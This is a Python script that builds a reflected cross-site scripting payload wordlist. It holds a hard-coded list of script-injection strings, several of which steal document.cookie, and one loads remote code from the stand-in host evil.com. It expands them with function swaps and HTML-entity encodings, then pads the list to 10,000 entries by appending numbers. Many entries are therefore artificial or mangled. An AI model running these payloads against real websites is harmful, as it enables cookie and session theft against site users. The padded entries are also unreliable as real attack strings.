payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '\"><svg/onload=confirm(1)>',
    '<math><mtext></mtext><script>alert(1)</script></math>',
    '<link rel="stylesheet" href="javascript:alert(1)">',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<details open ontoggle=alert(1)>X',
    '<video><source onerror="alert(1)">',
    '<audio><source onerror="alert(1)">',
    '<img src="x" onerror="javascript:alert(document.cookie)">',
    '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',
    '<img src=1 href=1 onerror="javascript:prompt(1)">',
    '<marquee onstart=alert(1)>',
    '<form><button formaction="javascript:alert(1)">CLICK',
    '<input autofocus onfocus=alert(1)>',
    '<keygen autofocus onfocus=alert(1)>',
    '<video autoplay src onloadstart="alert(1)">',
    '<svg xmlns="http://www.w3.org/2000/svg"><animation onbegin="alert(1)"/>',
    '<a href="javas&#99;ript:alert(1)">click',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '<table background="javascript:alert(1)">',
    '<div style="background-image:url(javascript:alert(1))">',
    '<div style="width:expression(alert(1));">',
    '<isindex onfocus=alert(1)>',
    '<base href="javascript:alert(1);//">',
    '<img src=xx:x onerror=alert(1)>',
    '<img src= onerror=alert(1)>',
    '<style>@import\'javascript:alert(1)\';</style>',
    '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '<img srcset=x onerror=alert(1)>',
    '<button formaction="javascript:alert(1)">CLICK',
    '<style>*{background:url("javascript:alert(1)")}',
    '<input type="image" src="x" onerror="alert(1)">',
    '<img src="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>alert(1)</script>">',
    '"><script>alert(document.domain)</script>',
    '"><img src=x onerror=confirm(document.cookie)>',
    '<svg><script xlink:href="data:image/svg+xml;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></script></svg>',
    '<div onpointerover=alert(1)>Pointer Event',
    '<plaintext><script>alert(1)</script>',
    '<xss id=x tabindex=1 onactivate=alert(1)></xss>',
    '<object type="text/x-scriptlet" data="http://evil.com/xss.sct"></object>',
]

# Expand with variations
expanded_payloads = []

for payload in payloads:
    expanded_payloads.append(payload)
    expanded_payloads.append(payload.replace('alert', 'prompt'))
    expanded_payloads.append(payload.replace('1', 'document.cookie'))
    expanded_payloads.append(payload.replace('alert', 'confirm'))
    expanded_payloads.append(payload.replace('<script>', '<script>void(').replace('</script>', ')</script>'))

# Generate minor encoded versions
encoded_payloads = []
for payload in expanded_payloads:
    encoded_payloads.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
    encoded_payloads.append(payload.replace('"', '&quot;').replace("'", '&#39;'))

# Combine
final_payloads = list(set(payloads + expanded_payloads + encoded_payloads))

# Artificially create more by appending variations
while len(final_payloads) < 10000:
    for payload in list(final_payloads):
        if len(final_payloads) >= 10000:
            break
        final_payloads.append(payload + str(len(final_payloads)))

# Save
with open('reflective_xss_payloads.txt', 'w', encoding='utf-8') as f:
    for p in final_payloads:
        f.write(p + '\n')

print(f"[+] Successfully generated {len(final_payloads)} Reflective XSS payloads in 'reflective_xss_payloads.txt'")
